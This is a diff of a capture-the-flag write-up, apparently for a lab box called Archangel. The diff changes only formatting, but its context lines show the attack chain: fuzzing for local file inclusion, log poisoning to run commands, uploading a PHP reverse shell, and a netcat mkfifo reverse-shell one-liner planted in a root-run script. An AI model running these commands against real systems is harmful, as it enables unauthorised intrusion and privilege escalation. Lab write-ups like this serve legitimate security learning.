@@ -11,6 +11,7 @@ And by scanning with nmap:
 
 Let's browse the IP:
 ![](https://github.com/user-attachments/assets/2831506c-307f-42f4-b3c0-2ec9bf728fbb)
+
 As we can see, there's a hint for a "mafialive.thm" domain, so let's add this domain to the `etc/hosts` file:
 `sudo nano /etc/hosts`
 ![](https://github.com/user-attachments/assets/fd8c6508-2849-4b47-bde2-252251bac54c)
@@ -47,7 +48,8 @@ Now we're in `http://mafialive.thm/test.php?view=/var/www/html/development_testi
 Let's fuzz for LFI:
 `ffuf -u "http://mafialive.thm/test.php?view=/var/www/html/development_testing/FUZZ" -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -c -t 50 -r`
 
-Only to find out many false positives. 
+Only to find out many false positives.
+
 Let's try filtering through size and words:
 `ffuf -u "http://mafialive.thm/test.php?view=/var/www/html/development_testing/FUZZ" -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -c -t 50 -r -fs 286 -fw 41`
 ![](https://github.com/user-attachments/assets/fe5dd264-9e58-4be5-8d52-8f9daa0ddc83)
@@ -92,6 +94,7 @@ And we'll try if it's working by injecting `&cmd=whoami` in the URL:
 `http://mafialive.thm/test.php?view=/var/www/html/development_testing/..//..//..//..//..//..//..//../var/log/apache2/access.log&cmd=whoami`
 
 Now we have code execution.
+
 We can use it to upload a php reverse shell (`shell.php`) using wget and URL encoding the space, immediately after opening the server.
 ![](https://github.com/user-attachments/assets/c8d81dca-ab7c-431d-a3c8-ddf81e64d3d5)
 
@@ -130,8 +133,7 @@ If we `ls -la` the file we can see we have write permission on it.
 We will echo this one liner into the file and wait for the execution by root:
 `echo "rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.21.97.226 4445 >/tmp/f" >> helloworld.sh`
 (Activate netcat in another terminal on port 4445)
-And obviously, we will stabilize the shell again
-and search for the flag of the user archangel.
+And obviously, we will stabilize the shell again and search for the flag of the user archangel.
 ![](https://github.com/user-attachments/assets/f8ad5060-bc0f-4ff5-9262-a05c0ac7ebfa)
 
 
